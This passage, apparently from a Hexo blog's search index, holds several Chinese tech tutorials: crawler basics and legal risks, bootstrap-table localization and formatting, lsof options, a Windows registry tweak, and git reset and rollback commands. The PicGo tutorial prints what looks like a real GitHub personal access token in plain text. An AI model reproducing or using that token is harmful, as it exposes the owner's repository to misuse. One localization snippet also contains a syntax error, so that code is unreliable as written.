模块，后面我们写异步爬虫时就可以对数据库进行异步操作了。</p><p>存储的另一个问题就是数据库设计，需要考虑到数据去重以及后期读取问题。</p><p>4.数据更新：</p><p>如何保证爬取数据的及时性，网站时刻都在发布最新信息，爬虫在织网式抓取“旧”信息的同时，如何兼顾获取“新”信息？</p><p>5.异常处理、日志记录</p><p>我们写的爬虫在运行过程中，会出现各种异常，而且有些异常是不可预期的，也不知道它会出现在什么地方，我们就需要用try来捕获异常让程序不中断，但是我们又需要看看捕获的异常是什么内容，由此来改善我们的爬虫。这个时候，就需要进行异常处理并记录日日志。logging 模块，Python提供的输出日志的模块，可以输出到屏幕（stdout、stderr），也可以输出到文件。爬虫在运行过程中，可能会碰到千奇百怪的异常，把这些异常都记录下来，可以很好的帮助改善爬虫。</p><p>6.分布式爬虫部署</p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/20200428131033.jpg"></p><p>每一个爬虫的调度器Scheduler都从队列中取出请求和存入请求，这样就实现多个爬虫，多台机器同时爬取的目标。</p><p>7.和爬虫无关的 但也是后续要做的就是 数据分析以及数据可视化过程。</p><h3 id="三、其他"><a href="#三、其他" class="headerlink" title="三、其他"></a>三、其他</h3><h4 id="推荐框架"><a href="#推荐框架" class="headerlink" title="推荐框架"></a>推荐框架</h4><p>Scrapy：该框架应该是Python爬虫使用最多的爬虫框架了，利用这个框架我们可以快速地完成爬虫的开发。而且框架本身性能卓越、可配置性极强，开发者社区也十分活跃，具有配套的各种插件，几乎可以实现任何站点的爬取逻辑。官网：<a href="scrapy.org/">scrapy.org</a></p><h4 id="推荐书目"><a href="#推荐书目" class="headerlink" title="推荐书目"></a>推荐书目</h4><p>《Python3网络爬虫开发实战》</p><p>《Python3 反爬虫原理与绕过实战》</p><p>《精通Scrapy网络爬虫》</p><h4 id="法律问题"><a href="#法律问题" class="headerlink" title="法律问题"></a>法律问题</h4><p>那既然是公开数据，为什么还会有人因为爬虫被抓坐牢呢？因为有些团队或机构，大量收集一些公司或者个人数据，并且因此<strong>获利</strong>时（或者影响数据生产方利益时），会让数据生产方或者被侵犯的个人很不爽，就会由此产生法律纠纷。爬虫违法主要原因有：</p><p>1.为违法违规组织提供爬虫相关服务</p><p>例如，厦门有个技术宅男杨某，培训AI人工智能学习识别各种验证码，帮助黑客认证个人信息，一年牟利300多万。</p><p>2.个人隐私数据抓取与贩卖</p><p>例如，简历大数据公司“巧达科技”利用某知名互联网公司某个接口，窃取了大量客户信息，用于出售简历数据。</p><p>感兴趣的可以查看，<a href="https://github.com/HiddenStrawberry/Crawler_Illegal_Cases_In_China">中国爬虫违法违规案例汇总</a>，整理了中国大陆爬虫开发者涉诉与违规相关的新闻、资料与法律法规，了解下爬虫禁区。</p><h4 id="成功案例"><a href="#成功案例" class="headerlink" title="成功案例"></a>成功案例</h4><p>有好些公司的商业模式就建立在爬虫技术之上的，比如搜索引擎公司、大数据处理公司、网络舆情监控公司，没有数据，他们的公司就没法运转。google和百度、国民资讯app的今日头条（早期通过抓取数百家机构的新闻源，然后以技术手段来分发给用户，做到千人千面的阅读体验）、天眼查/企查查（ 这两家企业把各个省，市的官方几千万家工商信息抓取出来，结构化整合后提供给用户查询）、很多个人站长、自由职业者都是靠着抓取和整合数据做出了不错的流量和用户，每年有不菲的收入。</p><p>爬虫作为一种技术本身可能无所谓善恶，但是使用它的人就有善恶之分。如何使用爬虫，爬取的数据如何使用，都可能产生潜在的法律问题。无论何种目的，网络爬虫都不能突破法律的底线，守法合规，既是一直自我约束，也是自我保护。</p><h3 id="四、总结"><a href="#四、总结" class="headerlink" title="四、总结"></a>四、总结</h3><p>爬虫是一个运用综合技能的工作，一个好的爬虫工程师应该要具备前端(html、JS、浏览器和APP抓包)，HTTP知识，简单数据挖掘(数据结构化、清洗、排重等工作)，数据存储等知识。学习任何知识，都不应该纸上谈兵，要做的就是多动手练习，而在这个过程中，你会遇到各种各样的问题，各种各样的坑，而在解决这些问题中会摸索出该去掌握的技巧和经验，这都是学习和进阶的时刻。</p>]]></content>
      
      
      <categories>
          
          <category> 技术分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 爬虫 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>bootstrap-table 本地化中文设置</title>
      <link href="2020/04/26/2020-04-26-bootstrap-table_localized_Chinese_setting/"/>
      <url>2020/04/26/2020-04-26-bootstrap-table_localized_Chinese_setting/</url>
      
        <content type="html"><![CDATA[<h2 id="bootstrap-table本地化中文设置"><a href="#bootstrap-table本地化中文设置" class="headerlink" title="bootstrap-table本地化中文设置"></a>bootstrap-table本地化中文设置</h2><p>在网上查找到的几个办法：</p><p>###方法一引入不同的语言包</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src&#x3D;&quot;bootstrap-table-zh-CN.js&quot;&gt;&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><p>###方法二引入全语言包</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src&#x3D;&quot;bootstrap-table-locale-all.min.js&quot;&gt;&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;然后在初始化前设计默认语言</span><br><span class="line">$.extend($.fn.bootstrapTable.defaults, $.fn.bootstrapTable.locales\[&#39;zh-CN&#39;\]);</span><br></pre></td></tr></table></figure><p>个人按照实际需求解决方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line">$(&#39;#table&#39;).bootstrapTable(&#123; </span><br><span class="line"> &#x2F;&#x2F;加载数据时提示</span><br><span class="line">formatLoadingMessage:function()</span><br><span class="line">&#123;</span><br><span class="line">return &quot;数据加载中...&quot;;</span><br><span class="line">&#125;,</span><br><span class="line">&#x2F;&#x2F;每页显示</span><br><span class="line">formatRecordsPerPage:function(pageNumber)</span><br><span class="line">&#123;</span><br><span class="line">     return pageNumber+&#39;行每页&#39;;</span><br><span class="line">  &#125;,</span><br><span class="line">&#x2F;&#x2F;页码</span><br><span class="line">  formatShowingRows:function(pageFrom, pageTo, totalRows)</span><br><span class="line">          &#123;</span><br><span class="line">            return &quot;第&quot;+pageFrom+&quot;-&quot;+pageTo+&quot;行，总共&quot;+totalRows+&quot;&quot;;</span><br><span class="line">   &#125;,</span><br><span class="line"></span><br><span class="line">formatSRPaginationPreText :function()&#123;</span><br><span class="line">return &#39;上一页&#39;;</span><br><span class="line">&#125;,</span><br><span class="line"></span><br><span class="line">formatSRPaginationPageText:function(page)&#123;</span><br><span class="line">return &#39;跳转至&#39;+page;</span><br><span class="line">&#125;,</span><br><span class="line"> formatSRPaginationNextText:function()&#123;</span><br><span class="line">return &#39;下一页&#39;;</span><br><span class="line">&#125;,</span><br><span class="line"> </span><br><span class="line"> formatDetailPagination:function(totalRows)</span><br><span class="line"> &#123;</span><br><span class="line"> return &quot;总计：&quot;+totalRows;</span><br><span class="line"> &#125;</span><br><span class="line">,</span><br><span class="line">formatSearch:function()</span><br><span class="line">&#123;</span><br><span class="line">return  &quot;搜索&quot;;</span><br><span class="line">&#125;</span><br><span class="line">,</span><br><span class="line">formatClearSearch:function()</span><br><span class="line">&#123;</span><br><span class="line">return  &quot;清除搜索&quot;;</span><br><span class="line">&#125;</span><br><span class="line"> ,</span><br><span class="line">formatNoMatches:function()</span><br><span class="line">&#123;</span><br><span class="line">return  &quot;未查询到相关记录&quot;;</span><br><span class="line">&#125; ,</span><br><span class="line">  formatPaginationSwitch:function()</span><br><span class="line">  &#123;</span><br><span class="line">  return &quot;隐藏显示分页&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">,</span><br><span class="line">formatPaginationSwitchDown:function()</span><br><span class="line">  &#123;</span><br><span class="line">  return &quot;显示分页&quot;;</span><br><span class="line">  &#125;,</span><br><span class="line">formatPaginationSwitchUp:function()</span><br><span class="line">  &#123;</span><br><span class="line">  return &quot;隐藏分页&quot;;</span><br><span class="line">  &#125; ,</span><br><span class="line">formatRefresh:function()</span><br><span class="line">  &#123;</span><br><span class="line">  return &quot;刷新&quot;;</span><br><span class="line">  &#125;  ,</span><br><span class="line">formatToggle:function()</span><br><span class="line">  &#123;</span><br><span class="line">  return &quot;展开&quot;;</span><br><span class="line">  &#125;  ,</span><br><span class="line">formatToggleOn:function()</span><br><span class="line">  &#123;</span><br><span class="line">  return &quot;显示卡片视图&quot;;</span><br><span class="line">  &#125; ,  </span><br><span class="line">  formatToggleOff :function()</span><br><span class="line">  &#123;</span><br><span class="line">  return &quot;隐藏卡片视图&quot;;</span><br><span class="line">  &#125;,</span><br><span class="line">formatColumns:function()&#123;</span><br><span class="line">return &quot;列视图&quot;;</span><br><span class="line">&#125;</span><br><span class="line">,</span><br><span class="line">formatColumnsToggleAll:function()</span><br><span class="line">&#123;</span><br><span class="line">return &#39;Toggle all&#39;;</span><br><span class="line">&#125;</span><br><span class="line"> ,</span><br><span class="line">formatFullscreen:function()</span><br><span class="line">&#123;</span><br><span class="line">return &#39;全屏&#39;;</span><br><span class="line">&#125; ,</span><br><span class="line">formatAllRows function()</span><br><span class="line">&#123;</span><br><span class="line">return &#39;全部&#39;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> bootstrap-table </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux lsof命令详解</title>
      <link href="2020/04/25/2020-04-25-Linux_lsof_command_detailed_explanation/"/>
      <url>2020/04/25/2020-04-25-Linux_lsof_command_detailed_explanation/</url>
      
        <content type="html"><![CDATA[<h2 id="linux-lsof命令详解"><a href="#linux-lsof命令详解" class="headerlink" title="linux lsof命令详解"></a>linux lsof命令详解</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p><strong>lsof(list open files)是一个列出当前系统打开文件的工具。</strong>在linux环境下，任何事物都以文件的形式存在，通过文件不仅仅可以访问常规数据，还可以访问网络连接和硬件。所以如传输控制协议 (TCP) 和用户数据报协议 (UDP) 套接字等，系统在后台都为该应用程序分配了一个文件描述符，无论这个文件的本质如何，该文件描述符为应用程序与基础操作系统之间的交互提供了通用接口。因为应用程序打开文件的描述符列表提供了大量关于这个应用程序本身的信息，因此通过lsof工具能够查看这个列表对系统监测以及排错将是很有帮助的。</p><h3 id="输出信息含义"><a href="#输出信息含义" class="headerlink" title="输出信息含义"></a>输出信息含义</h3><p>在终端下输入lsof即可显示系统打开的文件，因为 lsof 需要访问核心内存和各种文件，所以必须以 root 用户的身份运行它才能够充分地发挥其功能。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">COMMAND PID USER FD TYPE DEVICE SIZE NODE NAME</span><br></pre></td></tr></table></figure><p>lsof每行显示的是一个打开的文件，如果不接参数，默认是列出所有进程打开的文件，如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">command：进程的名称</span><br><span class="line">PID：进程的标识符</span><br><span class="line">USER：进程的所有者</span><br><span class="line">FD：文件描述符</span><br><span class="line">TYPE：文件的类型</span><br><span class="line">DEVICE：指定磁盘的名称</span><br><span class="line">SIZE：文件的大小</span><br><span class="line">NODE：索引节点</span><br><span class="line">NAME：打开文件的确切名称</span><br></pre></td></tr></table></figure><p>重点了解：</p><p>　　FD：文件描述符</p><p>　　　　cwd：表示应用程序的当前工作目录。</p><p>　　　　txt：表示该文件是程序代码，如二进制程序本身或共享库，如上面显示的/sbin/init程序。</p><p>　　　　10u：数值表示应用程序的文件描述符，这个是打开文件时返回的一个整数。u表示被打开文件处于“读取”和“写入”模式，</p><p>　　　　　　 ®表示只读模式， w表示只写模式，W表示应用程序对整个文件的写锁，表示该文件描述符一次只能被一个应用</p><p>　　　　　　程序使用。文件描述符中有3个特殊的值，0、1、2，分别代表标准输入，标准输出和错误输出。所以，其他的文件</p><p>　　　　　　描述符一般是从3开始的。</p><p>　　TYPE：文件类型。例如：Unix、REG、DIR、CHR、BLK、FIFO等</p><h3 id="lsof常用参数"><a href="#lsof常用参数" class="headerlink" title="lsof常用参数"></a>lsof常用参数</h3><p>lsof语法格式是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsof ［options］ filename</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">lsof filename：显示打开指定文件的所有进程</span><br><span class="line">lsof -a：表示两个参数都必须满足时才显示结果</span><br><span class="line">lsof -p PID：查看某个指定PID进程的文件打开情况</span><br><span class="line">lsof -c string：列出COMMAND中包含string字符串的进程打开的所有文件</span><br><span class="line">lsof -u username：列出username用户下的进程打开的所有文件</span><br><span class="line">lsof -g gid：显示归属gid的进程情况</span><br><span class="line">lsof +d &#x2F;DIR&#x2F;：显示目录下被进程打开的文件</span><br><span class="line">lsof +D &#x2F;DIR&#x2F;：同上，但是会搜索目录下的所有目录，时间相对较长</span><br><span class="line">lsof -d FD：显示指定文件描述符的进程</span><br><span class="line">lsof -n：不将IP转换为hostname，缺省是不加上-n参数</span><br><span class="line">lsof -i：用以显示符合条件的进程情况</span><br></pre></td></tr></table></figure><p>示例：</p><p>列出所有打开的文件:</p><blockquote><p>lsof</p></blockquote><p>查看谁正在使用某个文件</p><blockquote><p>lsof   /filepath/file</p></blockquote><p>递归查看某个目录的文件信息</p><blockquote><p>lsof +D /filepath/filepath2/</p></blockquote><p>备注: 使用了+D，对应目录下的所有子目录和文件都会被列出</p><p>比使用+D选项，遍历查看某个目录的所有文件信息 的方法</p><blockquote><p>lsof | grep ‘/filepath/filepath2/’</p></blockquote><p>列出某个用户打开的文件信息</p><blockquote><p>lsof  -u username</p></blockquote><p>备注: -u 选项，u其实是user的缩写</p><p>列出某个程序所打开的文件信息</p><blockquote><p>lsof -c mysql</p></blockquote><p>备注: -c 选项将会列出所有以mysql开头的程序的文件，其实你也可以写成lsof | grep mysql,但是第一种方法明显比第二种方法要少打几个字符了</p><p>列出多个程序多打开的文件信息</p><blockquote><p>lsof -c mysql -c apache</p></blockquote><p>列出某个用户以及某个程序所打开的文件信息</p><blockquote><p>lsof -u test -c mysql</p></blockquote><p>列出除了某个用户外的被打开的文件信息</p><blockquote><p>lsof   -u ^root</p></blockquote><p>备注：^这个符号在用户名之前，将会把是root用户打开的进程不让显示</p><p>通过某个进程号显示该进行打开的文件</p><blockquote><p>lsof -p 1</p></blockquote><p>列出多个进程号对应的文件信息</p><blockquote><p>lsof -p 123,456,789</p></blockquote><p>列出除了某个进程号，其他进程号所打开的文件信息</p><blockquote><p>lsof -p ^1</p></blockquote><p>列出所有的网络连接</p><blockquote><p>lsof -i</p></blockquote><p>列出所有tcp 网络连接信息</p><blockquote><p>lsof  -i tcp</p></blockquote><p>列出所有udp网络连接信息</p><blockquote><p>lsof  -i udp</p></blockquote><p>列出谁在使用某个端口</p><blockquote><p>lsof -i :3306</p></blockquote><p>列出谁在使用某个特定的udp端口</p><blockquote><p>lsof -i udp:55</p></blockquote><p>特定的tcp端口</p><blockquote><p>lsof -i tcp:80</p></blockquote><p>列出某个用户的所有活跃的网络端口</p><blockquote><p>lsof  -a -u test -i</p></blockquote><p>列出所有网络文件系统</p><blockquote><p>lsof -N</p></blockquote><p>域名socket文件</p><blockquote><p>lsof -u</p></blockquote><p>某个用户组所打开的文件信息</p><blockquote><p>lsof -g 5555</p></blockquote><p>根据文件描述列出对应的文件信息</p><blockquote><p>lsof -d description(like 2)</p></blockquote><p>根据文件描述范围列出文件信息</p><blockquote><p>lsof -d 2-3</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 工具使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> lsof </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Win10 将CMD添加到右击菜单</title>
      <link href="2020/04/24/2020-04-24-Win10_add_CMD_to_right-click_menu/"/>
      <url>2020/04/24/2020-04-24-Win10_add_CMD_to_right-click_menu/</url>
      
        <content type="html"><![CDATA[<h2 id="Win10-将CMD添加到右击菜单"><a href="#Win10-将CMD添加到右击菜单" class="headerlink" title="Win10 将CMD添加到右击菜单"></a>Win10 将CMD添加到右击菜单</h2><p>1.Win键+R键输入“regedit”打开注册表</p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/20200424125412.png" alt="image-20200424125246405" style="zoom:67%;" /><p>2.打开“HKEY_CLASSES_ROOT\Directory\Background\shell”，shell右击新建项“在此处打开命令窗口”</p><p>3.右击“在此处打开命令窗口”，新建“command”项</p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/20200424125825.png" alt="image-20200424125702697"></p><p>4.依次点击command-&gt;右击右侧菜单第一项-&gt;修改添加</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;C:\Windows\System32\cmd.exe&quot; &quot;--working-dir&quot; &quot;%v.&quot;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/20200424125923.png" alt="image-20200424125922121"></p><p>5.完成效果如图</p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/20200424130032.png" alt="image-20200424130030341"></p>]]></content>
      
      
      <categories>
          
          <category> 环境配置 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>git 强制覆盖本地代码（与git远程仓库保持一致）</title>
      <link href="2020/04/24/2020-04-24-git_compulsorily_overwrite_local_code_consistent_with_git_remote_repository/"/>
      <url>2020/04/24/2020-04-24-git_compulsorily_overwrite_local_code_consistent_with_git_remote_repository/</url>
      
        <content type="html"><![CDATA[<h2 id="git-强制覆盖本地代码（与git远程仓库保持一致）"><a href="#git-强制覆盖本地代码（与git远程仓库保持一致）" class="headerlink" title="git 强制覆盖本地代码（与git远程仓库保持一致）"></a>git 强制覆盖本地代码（与git远程仓库保持一致）</h2><p>git强制覆盖：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git fetch --all</span><br><span class="line">git reset --hard origin&#x2F;master</span><br><span class="line">git pull</span><br></pre></td></tr></table></figure><p>git强制覆盖本地命令（单条执行）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git fetch --all &amp;&amp; git reset --hard origin&#x2F;master &amp;&amp; git pull</span><br></pre></td></tr></table></figure><p>第一个是：拉取所有更新，不同步；<br>第二个是：本地代码同步线上最新版本(会覆盖本地所有与远程仓库上同名的文件)；<br>第三个是：再更新一次（其实也可以不用，第二步命令做过了其实）</p>]]></content>
      
      
      <categories>
          
          <category> 工具使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Typora编写markdown文档并利用PicGo实现图片自动上传图床</title>
      <link href="2020/04/23/2020-04-23-Typora_writes_markdown_documents_and_uses_PicGo_to_automatically_upload_to_pictures_bed/"/>
      <url>2020/04/23/2020-04-23-Typora_writes_markdown_documents_and_uses_PicGo_to_automatically_upload_to_pictures_bed/</url>
      
        <content type="html"><![CDATA[<h2 id="Typora编写markdown文档并利用PicGo实现图片自动上传图床"><a href="#Typora编写markdown文档并利用PicGo实现图片自动上传图床" class="headerlink" title="Typora编写markdown文档并利用PicGo实现图片自动上传图床"></a>Typora编写markdown文档并利用PicGo实现图片自动上传图床</h2><h3 id="Markdown"><a href="#Markdown" class="headerlink" title="Markdown"></a>Markdown</h3><p>使用Markdown语法写文章，能够使作者更专注于能容内容，而不是排版。之前是用typora写的，这款软件也很不错，界面简洁舒适，而且可以实时预览,近乎完美但是却又不能达到完美,因为写文档的时候经常需要截图，然后从剪贴板从直接黏贴放进文档，但只是将截图存放在本机电脑上，所以一旦文档中有了截图，将Markdown文档迁移到别的电脑上展示的成本就大大增加（图片也要一并复制过去）。如果写静态博客还可以将图片配置到博客目录中，但是如果要写到一些公共博客平台，则必须使用链接引入图片，否则无法正常显示，所以需要图床功能。</p><h3 id="创建自己的GitHub图床"><a href="#创建自己的GitHub图床" class="headerlink" title="创建自己的GitHub图床"></a>创建自己的GitHub图床</h3><p>1.注册/登陆GitHub账号</p><p>2.创建Repository</p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/vscode_markdown.PNG" alt="vscode_markdown"></p><p>3.生成一个Token用于操作GitHub repository</p><p>github网站 -&gt; Settings -&gt; Developer Settings -&gt; Personal Access tokens -&gt; Generate new token (repo打勾)-&gt; 记住此token</p><p>4.PicGO中修改Github图床配置，即可使用PicGo上传图片生成链接。</p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/20200419194930.png"></p><p>- 设定仓库名：这里的格式为<code>用户名/仓库名</code>，比如我的就是 MambaInVeins/ImageHosting</p><p>- 设定分支名：这里写入分支名称，一般直接用<code>master</code>即可。</p><p>- 设定Token：将刚刚创建的令牌填入。e034f38977c62ece300d28a37f0805becff9198e</p><p>- 指定存储路径：这个地方可以通过写入一个路径名，从而实现指定目录的上传。</p><p>- 设定自定义域名：这个域名是为了后边自动生成图片地址拼接而用的，格式是：<code>https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master</code></p><p>这么几条配置完成之后，可以点击一下确定，然后将其设为默认图床，然后就可以投入使用了。</p><p><strong>注意picgo和typora安装目录不要有空格，我个人都放在了D盘的根目录下。否则会出现一些类似错误。图片路径和文件名最好都不要带特殊字符空格等，一个图片一个图片慢慢上传，或者复制粘贴图片，也可自动上传。</strong></p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/20200423230423.png" alt="image-20200423230421186"></p><p>在偏好设置中设置图像上传服务，并可以验证图片上传，现在就可以开心地在typora中粘贴图片了，还可以在格式-图像-上传所有本地图片。</p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/20200423230843.png" alt="image-20200423230841084"></p>]]></content>
      
      
      <categories>
          
          <category> 工具使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> typora </tag>
            
            <tag> markdown </tag>
            
            <tag> picgo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Git 版本回退</title>
      <link href="2020/04/23/2020-04-23-git_version_rollback/"/>
      <url>2020/04/23/2020-04-23-git_version_rollback/</url>
      
        <content type="html"><![CDATA[<h2 id="Git-版本回退"><a href="#Git-版本回退" class="headerlink" title="Git 版本回退"></a>Git 版本回退</h2><p><strong>git log</strong></p><p>该命令显示从最近到最远的提交日志。每一次提交都有对应的 commit id 和 commit message。如果嫌弃输出的信息杂乱无章，那么加上 –pretty=oneline 。</p><p><strong>git reset –hard id</strong></p><p>根据 id 回退到指定的版本，版本号id没必要写全，前几位就可以了，Git会自动去找。</p><p><strong>git push origin HEAD –force</strong></p><p>推送到本地到远程仓库：让远程仓库代码和你本地一样，到当前你本地的版本。</p><p><strong>git reflog</strong></p><p>用来记录你的每一次命令</p><h3 id="现在总结一下："><a href="#现在总结一下：" class="headerlink" title="现在总结一下："></a>现在总结一下：</h3><p>HEAD指向的版本就是当前版本，因此，Git允许我们在版本的历史之间穿梭，使用命令git reset –hard commit_id。</p><p>穿梭前，用git log可以查看提交历史，以便确定要回退到哪个版本。</p><p>要重返未来，用git reflog查看命令历史，以便确定要回到未来的哪个版本。</p>]]></content>
      
      
      <categories>
          
          <category> 工具使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>bootstrap-table 根据单元格中的数据改变单元格的样式</title>
      <link href="2020/04/22/2020-04-22-bootstrap-table_change_style_of_cell_according_to_data_in_cell/"/>
      <url>2020/04/22/2020-04-22-bootstrap-table_change_style_of_cell_according_to_data_in_cell/</url>
      
        <content type="html"><![CDATA[<h2 id="bootstrap-table-根据单元格中的数据改变单元格的样式"><a href="#bootstrap-table-根据单元格中的数据改变单元格的样式" class="headerlink" title="bootstrap-table 根据单元格中的数据改变单元格的样式"></a>bootstrap-table 根据单元格中的数据改变单元格的样式</h2><p>在bootstrap-table.js里面列属性 formatter就是用来格式化单元格的，其默认值是undefined 类型是function，function(value,  row, index), value：该cell本来的值，row：该行数据，index：该行序号（从0开始）；table的标签属性是：data-formatter。</p><p>可以在bootstrap-table.js直接设置formatter属性：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">formatter: function(value,row,index) &#123;</span><br><span class="line">&#x2F;&#x2F;通过判断单元格的值，来格式化单元格，返回的值即为格式化后包含的元素</span><br><span class="line">var a &#x3D; &quot;&quot;;</span><br><span class="line">if(value &#x3D;&#x3D; &quot;已完成&quot;) &#123;</span><br><span class="line">var a &#x3D; &#39;&lt;span style&#x3D;&quot;color:#00ff00&quot;&gt;&#39;+value+&#39;&lt;&#x2F;span&gt;&#39;;</span><br><span class="line">&#125;else if(value &#x3D;&#x3D; &quot;已分派&quot;)&#123;</span><br><span class="line">var a &#x3D; &#39;&lt;span style&#x3D;&quot;color:#0000ff&quot;&gt;&#39;+value+&#39;&lt;&#x2F;span&gt;&#39;;</span><br><span class="line">&#125;else if(value &#x3D;&#x3D; &quot;待办&quot;) &#123;</span><br><span class="line">var a &#x3D; &#39;&lt;span style&#x3D;&quot;color:#FF0000&quot;&gt;&#39;+value+&#39;&lt;&#x2F;span&gt;&#39;;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">var a &#x3D; &#39;&lt;span&gt;&#39;+value+&#39;&lt;&#x2F;span&gt;&#39;;</span><br><span class="line">&#125;</span><br><span class="line">return a;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>也可在html里面对单个表格进行设置：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span 